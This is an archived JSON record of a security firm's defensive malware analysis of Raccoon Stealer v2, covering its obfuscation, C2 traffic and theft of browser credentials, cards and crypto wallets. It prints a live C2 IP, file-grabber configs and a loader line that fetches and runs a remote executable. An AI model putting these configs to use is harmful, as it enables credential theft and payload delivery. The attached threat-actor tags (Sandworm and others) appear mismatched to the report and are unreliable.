{
    "id": "4f61df1b-2741-41f0-b0fd-26d6ceb51dd4",
    "created_at": "2023-01-12T15:01:35.827205Z",
    "updated_at": "2025-03-27T02:14:39.079886Z",
    "deleted_at": null,
    "sha1_hash": "d2f00df2a9d713e8f20a6acdc4e6787cf9b49eaa",
    "title": "2022-06-29 - Raccoon Stealer v2 – Part 2- In-depth analysis",
    "authors": "",
    "file_creation_date": "2022-08-18T03:29:59Z",
    "file_modification_date": "2022-08-18T03:29:59Z",
    "file_size": 2380474,
    "plain_text": "# Raccoon Stealer v2 – Part 2: In-depth analysis\n\n**blog.sekoia.io/raccoon-stealer-v2-part-2-in-depth-analysis/**\n\n## Introduction\n\n\n29 June 2022\n\n\nRaccoon is an information-stealing malware the likes of cryptocurrency wallet stealers such as\nAgentTesla, Formbook, Redline, and Vidar. In March 2022, Raccoon Team announced their temporary\nretirement due to missing team members related to the conflict between Ukraine and Russia that\nstarted in February 2022 on different forums (i.e. xss[.]is). They also mentioned they are working on a\nnew version of the malware.\n\nThis blog post is a technical analysis of the new Raccoon Stealer 2.0 stand-alone version. Authors\nhave announced that the malware is also available in a DLL format or could be embedded in other\nPE.\n\nLink to the analyzed sample :\nhttps://bazaar.abuse.ch/sample/022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf061\n67e03/\n\n[This article follows up the first publication on Raccoon Stealer v2 to analyse in depth the malware](https://blog.sekoia.io/raccoon-stealer-v2-part-1-the-return-of-the-dead/)\nfunctionalities and capabilities.\n\n\n-----\n\n## Technical overview\n\nRaccoon Stealer v2 is written in C/C++ and ASM, the standalone version is approximately 56 KB,\nmalware obfuscates its configuration and strings. It also performs dynamic linking. Communication\nwith its Command and Control servers occurs over HTTP; no encryption or data obfuscation is used to\nexchange with the attacker’s server.\n\nRaccoon v2 targets various crypto wallets, retrieves cookies and saves credit card numbers from\nbrowsers (Edge, Firefox and Chrome).\n\n## Run-time dynamic Linking\n\nThe first task performed by the malware is to link libraries functions, initially the PE initiates handles to\n`Shell32.dll`, `WinInt.dll`, `Crypt32.dll`, `Ole32.dll`, `User32.dll`, `Advapi32.dll` and Kernel32.dll.\nContrary to other malwares of the same family, Raccoon doesn’t hide the loading of `LoadLibrary` and\n`GetProcAddress` [T1055.001], moreover imported functions from the various libraries are stored in\nclear text.\n\n_Figure 1. Part of the decompiled function which executes the run-time dynamic linking_\n\n## Obfuscation techniques\n\nOnce the functions are imported, Raccoon deobfuscates [T1140] a list of strings used to set up\nCommand and Control communication, and exfiltration operations. This obfuscation technique is often\n[implemented in other malware. The obfuscated strings are RC4-encrypted [T1027] strings stored in](https://blog.sekoia.io/mars-a-red-hot-information-stealer/)\nbase64. The sample used two different RC4 keys, one for decrypting strings used later in the program\nand a second one to decrypt the list of C2.\n\n\n-----\n\n_Figure 2. Example of the multiple calls to the first deobfuscation function_\n\n_Figure 3. Decompiled version of the RC4 algorithm used in Raccoon v2_\n\n\n-----\n\n```\nlogins.json\n\n\\autofill.txt\n\n\\cookies.txt\n\n\\passwords.txt\n\n--\n-*/*\n\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nContent-Type: multipart/form-data; boundary=\n\nContent-Type: text/plain;\n\nUser Data\n\nwallets\n\nwlts_\n\nldr_\n\n```\n_Figure 4. Extract of deobfuscated data_\n\nAs mentioned in the beginning of this section, Raccoon Stealer used a different key to decrypt its\nCommand and Control URLs; the deobfuscated values are stored in an array. This array can take up\nto 5 values, which we assess as a capacity of the malware to have a backup Command and Control\ninstance to ensure resilience.\n\n_Figure 5. Deobfuscation of the Command and Control with the new RC4 key_\n\nThe deobfuscated C2 in the sample we analyzed is: `http://51.195.166[.]184/`\n\n\n-----\n\n_Figure 6. CyberChef recipe to deobfuscate the C2 URLs_\n\n## Mutex\n\nAfter the run-time dynamic linking and string deobfuscation, the stealer checks the existence of a\nMutex. In the sample we analyzed, its value is `8724643052 . If the mutex already exists, the process`\nexits, otherwise, the malware creates it and the malware further proceeds.\n\n_Figure 7. Mutex operation in Raccoon Stealer v2_\n\nIt is worth noting that the mutex test is the only technique we observed in the sample that would\nprevent malware execution.\n\n## Host checking\n\nThe malware then checks the privileges of the running process and returns zero in case the S-I-D\n(Security IDentifier) is `S-1-5-18 which stands for` `NT Authority\\System . However this function`\nalso returns zero if the process can neither get the token information nor convert its SID into a string\ntype.\n\n\n-----\n\n_Figure 8. Code checking current permissions_\n\nIf the process permission is not `NT Authority\\System, or the process cannot get its token`\ninformation, the malware does not perform the next function that loops over the running processes\n\n[T1057]. Again, the result of this function is not critical to the rest of the execution; the returned value\nis immediately erased by the next instruction. (cf.: `mov eax, some value`).\n\n_Figure 9. Malware listing running process of the infected host_\n\n_Nb: This non-usage of the return value likely indicates that Raccoon Stealer v2 is still under_\n_development._\n\n## Initial C2 communication\n\n\n-----\n\nAfter what can be considered the initiation phase, the malware begins to set up its first connection to\nthe Command and Control server [T1041].\n\nFirst, it gets the `MachineGuid by reading the Registry [T1012] to identify the infected host:`\n```\nHKLM:\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid\n\n```\n_Figure 10. Fingerprinting of the MachineGuid via the Registry_\n\nThen it reads the username from Adavapi32 library.\n\n_Figure 11. Code used to get the username_\n\nEventually, the data are concatenated with the following structure:\n\n```\nmachineId=<MachineGuid>|<UserName>&configId=<RC4 key>\n\n```\n\n_Figure 12. Host fingerprinting and Command and Control server communication_\n\n\n-----\n\nThe formatted data is sent to the C2 over HTTP in a POST request at the root of the server. It is\ninteresting to note that the loop requests the list of previously deobfuscated C2; the malware requests\nevery C2 in its list; the first to respond with data is assigned as the official C2 for the next\ncommunication.\n\nThe C2 replies with a significant configuration in plain text, which contains the following information:\n\nDownloading DLLs URLs;\nRequested functionalities:\n\nTake a screenshot (cf.: `scrnsht_`);\nCache investigation of the Telegram desktop application (cf.: `tlgrm_`);\nNext stage setup and execution (cf.: `ldr_1`);\nBrowser extensions to search for (cf.: `ews_`);\nCryptographic Wallets of interest (cf.: `wlts_`);\nA token used to define the HTTP C2 endpoint for further communication.\n\n_Figure 13. Extract of the configuration sent by the C2 server to infected host_\n\nAll of the described configurations are not always set up; for example, screenshot capture or next\nstage loader are often missing, they might not be present by default.\n\n## DLLs setup\n\nAs presented in the previous section, the malware retrieves information about the URLs hosting the\nfollowing DLLs to be downloaded [T1105]:\n\nnss3.dll\nnssdbm3.dll\nmsvcp140.dll\nvcruntime140.dll\nmozglue.dll\nfreebl3.dll\nsoftokn3.dll\nsqlite3.dll\n\nThese are legitimate third-party DLLs allowing malware to collect data on the infected host.\n\n\n-----\n\n_Figure 14. PCAP extract of the DLLs downloading_\n\n_Figure 15. Decompiled code downloading the libraries_\n\nAfter parsing the list of DLLs, the malware contacts another Command and Control server to\ndownload them. The DLLs are then dropped on the infected host.\n\n_Note: At this stage, libraries are not loaded into memory._\n\n## Host fingerprinting\n\nRaccoon fingerprints the infected host and the following information are collected [T1082]:\n\nUser CID\nTimeZone [T1614]\nOS version\nHost architecture\nCPU information\nRAM capacity\nInformation about display devices\nList installed applications [T1518]\n\n\n-----\n\n_Figure 16. Advanced host fingerprinting_\n\nAll information is gathered in a file named `System Info.txt` which is sent to the C2 server in a POST\nrequest with the content type `application/x-object`. This time, the C2 URL changes, the token\nextracted from the configuration (the one received in the first HTTP response) is used as the new\nHTTP endpoint.\n\n\n-----\n\n_Figure 17. Sended packet to the C2 containing fingerprint information_\n\n## Configuration big picture\n\nAs introduced in the section `C2 communication initiation`, the sample obtains a configuration with a\nparticular structure. Each line of the configuration, which is text-based, defines a type and how to\ncollect information on the host. `wlts_` and `ews_` are prefixes used in the configuration, `wlts_`\nstands for wallets and `ews_` for browser web extension, as shown below by two configuration\nexamples:\n\n```\news_auromina:cnmamaachppnkjgnildpdmkaakejnhae;AuroWallet;Local Extension\n\n```\n```\nSettings\n\n```\n```\nwlts_xmr:Monero;5;Monero\\\\wallets;*.keys;\n\n```\n\nConfiguration for browser extensions is defined by three values separated by semicolon: the browser\nextension directory name, the name and the type of extension, the extension type can be `Local\nExtension Settings` or `IndexedDB`.\n\n\n-----\n\nConfiguration for wallets is a bit more complex. Here the values are separated by a semicolon: the\nfirst value is the wallet name, the second value is an integer, the next values are files and/or\ndirectories pattern to search.\n\n## Stealing functions summary\n\nThe execution flow for the next functions is as follows (each step is detailed in the next sections of this\narticle):\n\n1. Use sqlite3.dll to retrieve credit card information, cookies and saved passwords by browser\n\n(autofill) [T1539] [T1555.003];\n2. Use mozglue3.dll to get logins.json, cookies, and histories from Firefox [T1539] ;\n3. Parse the received configuration to search for particular crypto wallets (cf.: `wlts_` and `ews_`)\n\n[T1005];\n4. Search file named `wallet.dat` [T1005];\n5. Grab files according to the pattern set in the configuration; [optional] [T1119]\n6. Investigate into the Telegram Desktop cache; [optional]\n7. Capture a screenshot of the infected host desktop; [optional] [T1113]\n8. Load and execute the next stage. [optional] [T1106]\n\n\n-----\n\n_Figure 18. Part of the main function doing the data theft, screenshot capture and next stage loading_\n\n## Data extraction with sqlite3.dll\n\nThe first function in charge of stealing data on the infected host loops over files to search for `User\nData` (Edge and Chrome browsers) and `pera` file names.\n\n_Figure 19. Extract of the code executing the SQL queries_\n\n\n-----\n\nOnce a file is found, the malware triggers the execution of a list of functions that executes sqlite\nqueries, then their results are parsed and formatted to be sent to the C2 server.\n\nThe next two screenshots are examples of SQL queries to get [T1539] [T1555.003]:\n\n1. cookies\n2. credit cards information ( holder’s name, number, expiration date)\n\n_Figure 20. Example of SQL used to retrieved cookies_\n\n_Figure 21. Example of SQL query used to retrieve credit card numbers from Google chrome file_\n\nFinally, the function will parse the retrieved configuration (eg: `ews_`) and search for the browser\nextensions directory (generally located under `AppData\\Local\\Google\\User`\n```\nData\\Default\\Extensions for Google Chrome) .\n\n```\nWhen data is collected from different sources, the malware formats these data before sending them to\nthe C2 server.\n\nInteresting observation: for each function that uses the sqlite3.dll exported functions, the malware reassigns imports (cf.: `GetProcAddress`). A similar behavior is observed for the other downloaded\nDLLs.\n\n\n-----\n\n_Figure 22. Reference to sqlite3 prepare_v2 function loading_\n\n## Data extraction with nss3.dll\n\nThe process is the same with nss3.dll, the malware is looking for particular files matching known\npatterns related to the web browser.\n\nThis time, it targets cookies, logins.json files and the browser history [T1539] [T1555.003].\n\n_Figure 23. Other function responsible to retrieved web browser data_\n\n## Wlts_ extraction\n\nA list of wallets to search on the infected host is sent by the C2, these wallets are prefixed by `wlts_`.\nThe method is simple: it loops over the configuration when the first six bytes match `wlts_`, then\nRaccoon Stealer parses the leftover of the configuration line to search for particular file patterns. In\ncase a pattern match, the file is copied and sent to the C2 server [T1005].\n\n_Figure 24. Extract of the configuration sent by the C2 used for the wallet investigation_\n\n\n-----\n\n_Figure 25. Workflow of the function used to search file, copy it content and format it for the C2_\n\n1. Loop over files and directories until a pattern matches\n2. Create a copy of the file\n3. Format exfiltrated data before sending them to the C2\n\n\n-----\n\nAgain, if a wallet is found, a POST HTTP request with a copy of the wallet written in-body is sent to\nthe C2; otherwise no request is made.\n\n## Wallet.dat\n\nIn this function, Raccoon Stealer iterates the different directories to search for files named\n```\nwallet.dat (ref: bitcoin wallet). No particular operation is performed against this file [T1005]\n\n```\n[T1083].\n\n_Figure 26. Extract of the code used to search wallet.dat file_\n\n## File grabber\n\nIn the configuration, the malware may receive the following line:\n\n```\ngrbr_:%USERPROFILE%\\Desktop|.*txt`|*recycle*,*windows*|20|1|1|1|files\n\n```\n\nThe above configuration indicates to the malware to look for all text files ( .txt) in the desktop folder\n\n[T1083] [T1119]. No particular operation is performed on the filename or its content. In case a file\nmatches the given pattern, a copy is sent to the C2.\n\n## Telegram cache investigation\n\nThe last stealing function used by Raccoon Stealer consists of investigating the Telegram Desktop\ncache data located under the `Telegram Desktop\\tdata` directory.\n\n\n-----\n\nThe related configuration line is:\n\n```\ntlgrm_Telegram:Telegram Desktop\\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*\n\n```\n\nThe `tdata` directory of the Telegram Desktop application is used to store the application cache where\nvaluable data is stored, for instance session cookies.\n\n## Screenshot capture\n\nAnother capability of the Raccoon Stealer is to take a screenshot and send it to the C2 server [T1113].\nThe figure below shows the process initiating the Device Context on the desktop window handler,\nfollowed by the capture of an area and its conversion into a bitmap.\n\n_Figure 27. Decompiled code used to create the screenshot capture_\n\nThe screenshot operation is optional in Raccoon workflow. The condition to execute this function is to\nreceive in the configuration the `scrnsht_` line (cf.: `scrnsht_Screenshot.jpeg|1`), where\n`Screenshot.jpeg` capture name will be prefixed by `—` before being exfiltrated to the C2 server again\nwith content type `application/x-object`.\n\n\n-----\n\n_Figure 28. HTTP packet containing the screenshot sent to the C2_\n\n## Next stage loader\n\nFinally, the malware ends up processing the configuration sent in the first HTTP response, by parsing\nits last line:\n\n```\nldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\\|exe\n\n```\n\nThis instruction pertains to the loader configuration, whose structure is `ldr_X:URL|execution\ndirectory|PE type`. This configuration is in charge of loading and executing the next stage [T1106]\n\n[T1407]. The payload choice is up to the actor who purchased Raccoon. In this analysis, the dropped\nand executed payload is a basic Trojan.\n\n`X` is an integer whose value indicates which type of loading should be used:\n\n`3` indicates to execute the payload directly (no investigation done on this case due to the lack\nof sample matching this scenario);\n`2` is not implemented;\n`1` means the payload is located on a remote host and needs to be downloaded before being\nexecuted.\n\n\n-----\n\n_Figure 29. Loading of the next payload from a remote file and its execution with ShellExecuteW_\n_function_\n\n_Nb: We assess that the last argument (PE type) in the configuration line likely allows Raccoon Stealer_\n_to load other binaries than executable, such as a shellcode or a DLL, that can be embedded in the_\n_Raccoon Stealer binary._\n\n## Command and Control communications summary\n\nAfter loading and executing the next stage, Raccoon Stealer’s job is done. To sum up, see the\nnetwork capture of the analyzed sample below, that shows a typical exchange between the Command\nand Control server and the infected host:\n\n_Figure 30. Summary of the network communication between the infected host and the C2 with_\n_Wireshark_\n\n1. Register the new infected host and retrieve the stealer configuration;\n2. Download DLLs;\n3. Send `System Info.txt with host fingerprint information;`\n4. Send stolen data (wallet(s), password(s), etc…);\n5. Send `---Screenshot.jpeg file;`\n6. Download the next stage of the infection.\n\n## YARA rule\n\n\n-----\n\nAs described in the obfuscation techniques section, the new version of Raccoon Stealer hides its\nstrings and configuration using a very common technique (base64 encoded with RC4). The following\nYARA rule matches the implemented RC4 decryption algorithm, and at least 20 occurrences, of the\nstring deobfuscation routine.\n```\nrule infostealer_win_raccoon_v2_rc4 {\n\n  meta:    \n\n       malware = \"Raccoon\"\n\n    description = \"Finds samples of the Raccoon Stealer V2 based on the RC4 decryption\nalgorithm and the deobfuscation routine\"\n\n    author = \"SEKOIA.IO\"\n\n    creation_date = \"2022-06-16\"\n\n    modification_date = \"2022-06-16\"\n\n  strings:\n\n    $rc4_opcode = {99 f7 7d fc 8b 45 10 0f be 04 02 03 c1 03 f0 81 e6 ?? ?? ?? ?? 79 08 4e\n81 ce ?? ?? ?? ?? 46}\n\n    $deobfuscation = {8d 4d ?? 51 50 8b ce e8 ?? ?? 00 00 8d 55 ?? a3 ?? ?? ?? ?? b9 ?? ??\n?? ?? e8 ?? ?? ff ff 57}\n\n  condition:\n\n    $rc4_opcode and #deobfuscation > 20 and filesize < 70KB \n\n}\n\n## Configuration extractor\n\n```\nThe python extraction script solely works for stand-alone PE of Raccoon Stealer v2 and it is available\non the [SEKOIA.IO Community Github.](https://github.com/SEKOIA-IO/Community/blob/main/scripts/raccoon_stealer_v2_c2_extrator.py)\n\n## Targeted Browser extensions and wallets\n\n### Targeted wallets\n\nBitcoin\nExodus\nAtomic\nJaxxLiberty\nBinance\nCoinomi\nElectrum\nElectrum-LTC\nElectrumCash\nGuarda\nBlockstreamGreen\nLedger\nDaedalus\nMyMonero\nMonero\nWasabi\n\n\n-----\n\n### Targeted browser web extensions\n\nMetaMask\nTronLink\nBinanceChain\nRonin\nMetaX\nXDEFI\nWavesKeeper\nSolflare\nRabby\nCyanoWallet\nCoinbase\nAuroWallet\nKHC\nTezBox\nCoin98\nTemple\nICONex\nSollet\nCloverWallet\nPolymeshWallet\nNeoLine\nKeplr\nTerraStation\nLiquality\nSaturnWallet\nGuildWallet\nPhantom\nTronLink\nBrave\nMEW_CX\nTON\nGoby\n\n## MITRE ATT&CK TTPs\n\n**Tactic** **Technique** **Description**\n\n\nDefense\nEvasion\n\nDefense\nEvasion\n\n\nT1140 –\nDeobfuscate/Decode\nFiles or Information\n\nT1027 – Obfuscated\nFiles or Information\n\n\nRaccoon Stealer 2.0 decodes strings and the C2 configuration\nin the malware using RC4 and base64.\n\nRaccoon Stealer 2.0 uses RC4-encrypted strings.\n\n\n-----\n\nCredential\nAccess\n\nCredential\nAccess\n\n\nT1539 – Steal Web\nSession Cookie\n\nT1555.003 –\nCredentials from\nPassword Stores:\nCredentials from\nWeb Browsers\n\n\nDiscovery T1083 – File and\nDirectory Discovery\n\nDiscovery T1057 – Process\nDiscovery\n\nDiscovery T1012 – Query\nRegistry\n\nDiscovery T1518 – Software\nDiscovery\n\nDiscovery T1082 – System\nInformation\nDiscovery\n\nDiscovery T1614 – System\nTime Discovery\n\nCollection T1119 – Automated\nCollection\n\nCollection T1005 – Data from\nLocal System\n\nCollection T1113 – Screen\nCapture\n\n\nCommand\nand\nControl\n\nCommand\nand\nControl\n\nCommand\nand\nControl\n\n\nT1071.001 –\nApplication Layer\nProtocol: Web\nProtocols\n\nT1041 – Exfiltration\nOver C2 Channel\n\nT1105 – Ingress Tool\nTransfer\n\n\nRaccoon Stealer 2.0 harvests cookies from popular browsers.\n\nRaccoon Stealer 2.0 collects passwords from popular browsers.\n\nRaccoon Stealer 2.0 lists files and directories to grab files\nthrough all disks.\n\nRaccoon Stealer 2.0 lists the current running processes on the\nsystem.\n\nRaccoon Stealer 2.0 queries the Windows Registry key at\nHKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid to\nretrieve the MachineGuid value.\n\nRaccoon Stealer 2.0 lists all installed software for the infected\nmachine, by querying the Windows Registry key at\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\uninstall\n\nRaccoon Stealer 2.0 collects OS version, host architecture,\nCPU information, RAM capacity and display device information.\n\nRaccoon Stealer 2.0 collects the time zone information from the\nsystem.\n\nRaccoon Stealer 2.0 scans the disks and automatically collects\nfiles.\n\nRaccoon Stealer 2.0 collects credentials of cryptocurrency\nwallets from the local system.\n\nRaccoon Stealer 2.0 captures a screenshot of the victim’s\ndesktop.\n\nRaccoon Stealer 2.0 uses HTTP for C2 communications.\n\nRaccoon Stealer 2.0 exfiltrates data over the C2 channel.\n\nRaccoon Stealer 2.0 downloads legitimate third-party DLLs for\ndata collection onto compromised hosts.\n\n\nExecution T1106 – Native API Raccoon Stealer 2.0 has the ability to launch files using\nShellExecuteW.\n\n\n-----\n\nDefense\nEvasion\n\nDefense\nEvasion\n\n\nT1055.001 –\nProcess\nInjection: Dynamiclink Library Injection\n\nT1407 – Download\nNew Code at\nRuntime\n\n\nRaccoon Stealer 2.0 has the ability to load DLLs via\nLoadLibraryW and GetProcAddress.\n\nRaccoon Stealer 2.0 downloads its next stage from a remote\nhost.\n\n\nThank you for reading this article. You can also read our article on:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-29 - Raccoon Stealer v2 – Part 2- In-depth analysis.pdf"
    ],
    "report_names": [
        "2022-06-29 - Raccoon Stealer v2 – Part 2- In-depth analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535695,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1660793399,
    "ts_modification_date": 1660793399,
    "files": {
        "pdf": "https://archive.orkl.eu/d2f00df2a9d713e8f20a6acdc4e6787cf9b49eaa.pdf",
        "text": "https://archive.orkl.eu/d2f00df2a9d713e8f20a6acdc4e6787cf9b49eaa.txt",
        "img": "https://archive.orkl.eu/d2f00df2a9d713e8f20a6acdc4e6787cf9b49eaa.jpg"
    }
}